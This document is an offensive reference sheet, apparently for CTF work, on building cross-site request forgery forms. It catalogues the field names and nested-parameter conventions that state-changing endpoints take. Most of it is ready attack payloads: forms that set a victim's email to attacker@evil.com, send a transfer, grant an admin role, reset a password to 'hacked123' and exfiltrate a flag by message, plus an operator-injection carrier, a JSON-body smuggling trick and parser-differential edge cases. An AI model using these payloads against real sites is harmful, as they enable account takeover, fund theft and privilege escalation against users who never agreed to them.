# Form-fields corpus — the write's parameter shapes

Every field name, parameter convention, and write-shape a state-
changing endpoint takes — the dictionary for building the form's
input set.

---

## 1. The common write-field names — the parameter dictionary

```text
# identity / credential writes
email, new_email, mail, username, user, name, display_name,
password, new_password, pass, passwd, pwd, confirm_password,
current_password, old_password, phone, recovery_email

# role / privilege writes
role, is_admin, admin, group, permission, access, level,
is_staff, is_superuser, privilege, scope

# asset / transfer writes
amount, to, recipient, target, destination, account, balance,
quantity, value, transfer_to, pay_to, send_to, address, wallet

# object / content writes
id, object_id, post_id, item_id, title, content, body, text,
bio, description, note, comment, message, data, payload

# config / settings writes
setting, config, option, preference, theme, lang, timezone,
notifications, privacy, visibility, public, private, mode

# state transitions
status, state, approved, confirmed, verified, active, enabled,
disabled, published, draft, pending, rejected

# flag-path writes
flag, submit, assignment, claim, reward, solve, answer, submit_flag

# relationship writes
friend, follow, block, share, invite, collaborator, member, owner
```

## 2. The nested-field conventions — urlencoded object writes

```text
# PHP/Rails/qs nested — a[b]=1 → {a:{b:1}}
user[email]=x&user[role]=admin
settings[privacy]=public&settings[share]=all
account[balance]=0&account[currency]=usd
obj[id]=1&obj[owner]=attacker

# express extended / qs
a.b.c=1                            → some parsers → nested
filter[$where]=...                  → operator-injection carrier
data[items][]=1&data[items][]=2     → arrays

# dot-notation — some parsers
user.email=x
settings.privacy=public

# JSON-in-a-field — the app decodes a field's value
data={"a":1}
config={"role":"admin"}
payload=<urlencoded-json>
```

## 3. The write-shape per endpoint type — the input set

```html
<!-- a profile-update -->
<form action="/profile" method=POST>
<input name=email value="attacker@evil.com">
<input name=bio value="csrf-marker">
</form>

<!-- a transfer -->
<form action="/transfer" method=POST>
<input name=to value="attacker">
<input name=amount value="999">
</form>

<!-- a role-grant -->
<form action="/admin/role" method=POST>
<input name=user value="attacker">
<input name=role value="admin">
</form>

<!-- an email-change (for a password-reset chain) -->
<form action="/change-email" method=POST>
<input name=email value="attacker@evil.com">
</form>

<!-- a password-change -->
<form action="/change-password" method=POST>
<input name=new_password value="hacked123">
</form>

<!-- a privacy-toggle (make a private object public) -->
<form action="/settings" method=POST>
<input name=public value="true">
<input name=visibility value="public">
</form>

<!-- a flag-submit (the bot submits for you) -->
<form action="/submit" method=POST>
<input name=answer value="FLAG{...}">
<input name=challenge value="x">
</form>

<!-- a message-send (exfil via a message) -->
<form action="/message" method=POST>
<input name=to value="attacker">
<input name=body value="the flag">
</form>
```

## 4. The hidden-field override — fields the form adds

```html
<!-- hidden fields the real form would have — the CSRF mimics -->
<form action="/update" method=POST>
<input type=hidden name="_method" value="PUT">
<input type=hidden name="id" value="123">
<input type=hidden name="csrf_token" value="">   <!-- if not verified -->
<input name="a" value="1">
</form>
```

The CSRF form replicates the REAL form's fields — read the real
form to know which hidden fields the endpoint expects.

## 5. The real-form replication — reading the legitimate form

```bash
# the real form's fields — what the endpoint expects
curl -s -b "$CJ" "$BASE/profile" | grep -oE '<input[^>]+name="[^"]+"|<form[^>]+>'
# the names, the hidden fields, the method, the action
```

The CSRF form sends the same field names + the write's values.
A field the endpoint REQUIRES (a hidden id, a method override) must
be replicated.

## 6. The JSON-body field shapes — the object writes

```html
<!-- a JSON write — the fields as JSON keys -->
<input name='{"email":"' value='=attacker@evil.com"}'>
<!-- {"email":"=attacker@evil.com"} — the = inside the value -->

<input name='{"role":"' value='=admin","user":"x"}'>
<!-- {"role":"=admin","user":"x"} -->
```

## 7. The field-the-app-ignores — the bind model

```text
the CSRF's fields only write what the app's BIND accepts:
- a strict bind (a DTO/struct) → only declared fields land; extra
  ignored or rejected
- a mass-assign (Model.update(params)) → every field lands — the
  mass-assignment surface
- a permit() whitelist → only permitted fields land
```

```bash
# the bind — which fields the endpoint accepts
grep -rnoE 'permit|@bind|ShouldBind|allowed|whitelist|fields|params\.require|update\(|setattr' <src> | head -20
```

## 8. The field-naming edge cases — the parser-differential

```text
- a field the urlencoded parser reads differently than the app —
  'a[b]' vs 'a.b' vs 'a_b'
- a duplicate field — the parser takes first/last/all
- a field with a null-byte — 'a\0b' truncation
- a case-sensitivity gap — 'Admin' vs 'admin'
```

## 9. The corpus index — write → fields

| Write | The field set |
|---|---|
| email-change | `email`, `new_email`, `mail` |
| password-change | `password`, `new_password`, `confirm` |
| role-grant | `user`, `role`, `is_admin`, `permission` |
| transfer | `to`, `amount`, `recipient`, `account` |
| profile | `bio`, `name`, `email`, `theme`, `avatar` |
| settings | `privacy`, `public`, `notifications`, `config` |
| flag-submit | `answer`, `flag`, `challenge`, `submit` |
| message | `to`, `body`, `subject`, `recipient` |
| delete | `id`, `object_id`, `confirm` |
| approve | `id`, `status`, `approved` |

## 10. The falsifier

```text
the write needs a field the endpoint's bind won't accept cross-
origin (a field the strict-bind rejects, or a field only the real
form's JS computes) — the write can't be shaped. a field the
endpoint requires that's session-derived (a per-form nonce) is a
token-equivalent — the same falsifier.
```
